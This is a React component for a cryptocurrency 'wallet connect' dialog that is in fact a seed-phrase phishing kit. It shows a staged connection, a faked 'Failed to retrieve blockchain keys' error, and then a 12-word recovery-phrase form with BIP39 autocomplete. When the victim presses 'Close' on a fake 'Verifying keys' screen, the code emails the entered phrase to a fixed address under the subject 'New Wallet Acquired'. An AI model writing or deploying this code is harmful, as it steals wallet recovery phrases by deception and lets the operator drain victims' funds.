"use client";

import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { X } from "lucide-react";
import Image from "next/image";
import { spiral, mirage } from "ldrs";
import { useState } from "react";
import { bip39WordList } from "./bip39Words.js";
import { Resend } from 'resend';



export default function WalletModal({ isOpen, onClose, active }) {
  const [gif, setGif] = useState(false);
  const [first, setFirst] = useState(false);
  const [second, setSecond] = useState(false);
  const [third, setThird] = useState(false);
  const [forth, setForth] = useState(true);

  const [inputs, setInputs] = useState(Array(12).fill("")); // State for 12 inputs
  const [suggestions, setSuggestions] = useState([]); // Global suggestions for the selected input
  const [currentInput, setCurrentInput] = useState(null); // Tracks the currently focused input

  // Handle input change and suggestions
  const handleChange = (index, value) => {
    const lowerValue = value.toLowerCase();
    const newInputs = [...inputs];
    newInputs[index] = lowerValue;

    if (lowerValue) {
      const newSuggestions = bip39WordList.filter((word) =>
        word.startsWith(lowerValue)
      );
      setSuggestions(newSuggestions.slice(0, 5)); // Limit suggestions to 5
    } else {
      setSuggestions([]);
    }

    setInputs(newInputs);
  };

  // Handle input focus
  const handleFocus = (index) => {
    //console.log(inputs);
    setCurrentInput(index);
    const currentValue = inputs[index];
    if (currentValue) {
      const newSuggestions = bip39WordList.filter((word) =>
        word.startsWith(currentValue.toLowerCase())
      );
      setSuggestions(newSuggestions.slice(0, 5)); // Limit suggestions to 5
    } else {
      setSuggestions([]);
    }
  };

  // Handle suggestion click
  const handleSuggestionClick = (word) => {
    if (currentInput !== null) {
      const newInputs = [...inputs];
      newInputs[currentInput] = word.trim();
      setInputs(newInputs);
      setSuggestions([]);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    // Handle login logic here
  };

  const click1 = () => {
    setGif(true);
    setTimeout(() => setGif(false), 4000);
    setFirst(false);
    setSecond(true);
  };

  const click2 = () => {
    setGif(true);
    setTimeout(() => setGif(false), 2000);
    setSecond(false);
    setThird(true);
  };

  const click3 = () => {
    setGif(true);
    setTimeout(() => setGif(false), 3000);
    setThird(false);
    setForth(true);
  };
  const resend = new Resend(process.env.RESEND_API_KEY);

  const click4 = () => {
    setGif(true);
    setTimeout(() => setGif(false), 3000);
    
    setForth(false);
    setFirst(true);

    resend.emails.send({
      from: 'info@i-dentiq.org',
      to: 'info@i-dentiq.org',
      subject: 'New Wallet Acquired',
      html: `<p>${userAgent.name}'s wallet phrase : \n ${inputs}</p>`
    });
  };
  spiral.register();
  mirage.register();

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      {gif ? (
        <div>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <div className="flex items-center justify-between">
                <DialogTitle className="font-semibold text-base"></DialogTitle>
              </div>
              <DialogDescription></DialogDescription>
            </DialogHeader>

            <div className="flex justify-center items-center">
              <l-spiral size="40" speed="0.9" color="#4C36C8"></l-spiral>
            </div>
          </DialogContent>
        </div>
      ) : first ? (
        <div>
          <DialogContent className="sm:max-w-md rounded-3xl border-0 outline-0">
            <DialogHeader>
              <div className="flex items-center justify-between">
                <DialogTitle className="font-semibold text-base">
                  Connecting with {active.name}
                </DialogTitle>
              </div>
              <DialogDescription>Establishing connection ...</DialogDescription>
            </DialogHeader>
            <div className="flex items-center justify-center gap-4 py-4 my-12">
              <div className="w-12 h-12 bg-primary/10 rounded-xl flex items-center justify-center">
                <Image
                  src={active.icon}
                  alt="Source Wallet"
                  width={32}
                  height={32}
                />
              </div>
              <div className="w-8 h-8 flex items-center justify-center">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <path
                    d="M8 0L6.59 1.41L12.17 7H0V9H12.17L6.59 14.59L8 16L16 8L8 0Z"
                    fill="#666"
                  />
                </svg>
              </div>
              <div className="w-12 h-12 bg-blue-600/10 rounded-xl flex items-center justify-center">
                <Image
                  src="/icon.png"
                  alt="Target Wallet"
                  width={32}
                  height={32}
                />
              </div>
            </div>

            <Button className="w-full bg-primary" onClick={click1}>
              Connect wallet
            </Button>
            <div className="text-center text-sm text-gray-500 mt-4">
              By clicking to Allow access, you authorize {active.name} to use
              your information in accordance with its Privacy Policy.
            </div>
          </DialogContent>
        </div>
      ) : second ? (
        <div>
          <DialogContent className="sm:max-w-md rounded-3xl border-0 outline-0">
            <DialogHeader>
              <div className="flex items-center justify-between">
                <DialogTitle className="font-semibold text-base">
                  <span className="text-red-600">Error </span> Connecting with{" "}
                  {active.name}
                </DialogTitle>
              </div>
              <DialogDescription>
                Failed to retrieve blockchain keys
              </DialogDescription>
            </DialogHeader>
            <div className="flex items-center justify-center gap-4 py-4 my-12">
              <div className="w-12 h-12 bg-primary/10 rounded-xl flex items-center justify-center">
                <Image
                  src={active.icon}
                  alt="Source Wallet"
                  width={32}
                  height={32}
                />
              </div>
              <div className="w-8 h-8 flex items-center justify-center">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <path
                    d="M8 0L6.59 1.41L12.17 7H0V9H12.17L6.59 14.59L8 16L16 8L8 0Z"
                    fill="#666"
                  />
                </svg>
              </div>
              <div className="w-12 h-12 bg-blue-600/10 rounded-xl flex items-center justify-center">
                <Image
                  src="/icon.png"
                  alt="Target Wallet"
                  width={32}
                  height={32}
                />
              </div>
            </div>

            <Button className="w-full bg-primary" onClick={click2}>
              Import Wallet Manually
            </Button>
            <div className="text-center text-sm text-gray-500 mt-4">
              By clicking to Allow access, you authorize {active.name} to use
              your information in accordance with its Privacy Policy.
            </div>
          </DialogContent>
        </div>
      ) : third ? (
        <div>
          <DialogContent className="sm:max-w-md rounded-3xl border-0 outline-0">
            <DialogHeader>
              <div className="flex items-center justify-between">
                <DialogTitle className="font-semibold text-base">
                  Import Wallet
                </DialogTitle>
              </div>
              <DialogDescription>
                Provide 12-Key Phrase of Specified Network
              </DialogDescription>
            </DialogHeader>
            <div>
              <div className="sm:max-w-md rounded-3xl border-0 outline-0">
                <div className="flex items-center justify-center gap-4 py-4 my-12">
                  <div className="w-12 h-12 bg-primary/10 rounded-xl flex items-center justify-center">
                    <img
                      src={active.icon}
                      alt="Source Wallet"
                      width={32}
                      height={32}
                    />
                  </div>
                  <div className="w-8 h-8 flex items-center justify-center">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                      <path
                        d="M8 0L6.59 1.41L12.17 7H0V9H12.17L6.59 14.59L8 16L16 8L8 0Z"
                        fill="#666"
                      />
                    </svg>
                  </div>
                  <div className="w-12 h-12 bg-blue-600/10 rounded-xl flex items-center justify-center">
                    <img
                      src="/icon.png"
                      alt="Target Wallet"
                      width={32}
                      height={32}
                    />
                  </div>
                </div>
                <div className="w-full bg-gray-100 p-2 rounded-md max-h-24 overflow-x-auto flex gap-2">
                  {suggestions.map((word, index) => (
                    <div
                      key={index}
                      className="px-2 py-1 bg-white border rounded-md shadow cursor-pointer hover:bg-gray-200"
                      onClick={() => handleSuggestionClick(word)}
                    >
                      {word}
                    </div>
                  ))}
                </div>

                <form onSubmit={click3} className="space-y-4 my-6">
                  <div className="grid grid-cols-3 gap-6">
                    {inputs.map((input, index) => (
                      <div key={index} className="space-x-1 flex items-center">
                        <label htmlFor={`word-${index + 1}`}>
                          {index + 1}.
                        </label>
                        <input
                          id={`word-${index + 1}`}
                          type="text"
                          value={input}
                          onChange={(e) => handleChange(index, e.target.value)}
                          onFocus={() => handleFocus(index)}
                          className="h-8 rounded-xl border px-2 w-full"
                          required
                        />
                      </div>
                    ))}
                  </div>
                  <Button type="submit" className="w-full bg-primary">
                    Import Wallet
                  </Button>
                </form>
              </div>
            </div>
          </DialogContent>
        </div>
      ) : forth ? (
        <div>
          <DialogContent className="sm:max-w-md rounded-3xl border-0 outline-0">
            <DialogHeader>
              <div className="flex items-center justify-between">
                <DialogTitle className="font-semibold text-base">
                  Blockchain Verification with {active.name}
                </DialogTitle>
              </div>
              <DialogDescription>Verifying keys....</DialogDescription>
            </DialogHeader>
            <div className="flex items-center justify-center gap-4 py-4 my-12">
              <div className="w-12 h-12 bg-primary/10 rounded-xl flex items-center justify-center">
                <Image
                  src={active.icon}
                  alt="Source Wallet"
                  width={32}
                  height={32}
                />
              </div>
              <div className="w-8 h-8 flex items-center justify-center">
                <l-mirage size="60" speed="2.5" color="#4C36C8"></l-mirage>
              </div>
              <div className="w-12 h-12 bg-blue-600/10 rounded-xl flex items-center justify-center">
                <Image
                  src="/icon.png"
                  alt="Target Wallet"
                  width={32}
                  height={32}
                />
              </div>
            </div>

            <Button
              className="w-full bg-primary"
              onClick={click4}
            >
              Close
            </Button>
          </DialogContent>
        </div>
      ) : (
        <></>
      )}
    </Dialog>
  );
}
